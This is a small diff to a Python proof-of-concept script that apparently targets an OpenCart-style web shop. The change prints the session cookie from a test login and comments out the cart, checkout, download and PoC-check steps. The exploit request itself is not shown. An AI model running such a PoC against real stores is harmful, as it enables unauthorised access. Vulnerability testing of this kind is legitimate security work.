@@ -95,7 +95,7 @@ def logincus():
     burp0_data = "-----------------------------7e43a11530a14\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n1@qq.com\r\n-----------------------------7e43a11530a14\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n1234\r\n-----------------------------7e43a11530a14--\r\n"
     r=requests.post(burp0_url, headers=burp0_headers, data=burp0_data,verify=False)
     cus_cookies=r.cookies['OCSESSID']
-    #print(cus_cookies)
+    print(cus_cookies)
     return cus_cookies
     
 
@@ -249,11 +249,11 @@ if __name__ == "__main__":
     print("poc run ")
     register()
     cus_cookies=logincus()
-    addcart()
-    checkout()
-    r_check=download()
-    result=check_poc(r_check)
-    exit(result)
+    # addcart()
+    # checkout()
+    # r_check=download()
+    # result=check_poc(r_check)
+    # exit(result)
     
     # if (n1==200 and n2==200):
     #     print("PoC success!")
